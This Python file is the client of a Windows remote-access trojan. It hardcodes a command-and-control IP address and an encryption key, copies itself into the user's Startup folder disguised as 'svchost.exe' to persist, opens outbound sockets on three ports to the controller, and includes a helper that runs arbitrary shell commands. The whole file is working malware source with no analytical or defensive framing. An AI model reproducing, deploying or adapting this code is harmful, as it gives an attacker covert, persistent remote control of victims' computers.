from client_functions import advanced_client
import socket
import subprocess
import os
import getpass
from shutil import copyfile
import multiprocessing
import time

ip = "103.81.197.151"
key = b'I1GyxwhSCDK3CBXfM_mXRAKf9RzJxsdfQM8n27rTXnk='

def gethostname(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0] # hostname is required
    except:
        hostname = gethostname(ip)
    return hostname
    
hostname = (ip)


s = None

def connect_socket(port):
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname,port))
    return s

def send(text):
    s.send(bytes(text, "utf-8"))

def recv(chuncks):
    return s.recv(chuncks).decode("utf-8")

def shell(cmd):
    return subprocess.run(cmd, shell=True, stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE).stdout.decode("utf-8") 

def close():
    s.close()


        

def connect(s,hostname, port = 44221):
    time.sleep(1)
    try:
        userName = getpass.getuser()
        transfer_loc = "C:\\Users\\" + userName+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe"
        filename = "svchost.exe"
     
        if not os.path.exists(transfer_loc):
            copyfile(filename, transfer_loc)
            # os.system("copy " + filename + " \"" + transfer_loc + "\"")
    except:
        pass
        

    try:
        s = connect_socket(port)

        advanced_client(s,hostname)
    except:
        connect(s,hostname)
  

if __name__ == "__main__":
    # connect(s,hostname)
    multiprocessing.freeze_support()
    
    multiprocessing.Process(target=connect, args=[s,hostname, 44221]).start()
    multiprocessing.Process(target=connect, args=[s,hostname, 44222]).start()
    multiprocessing.Process(target=connect, args=[s,hostname, 44223]).start()


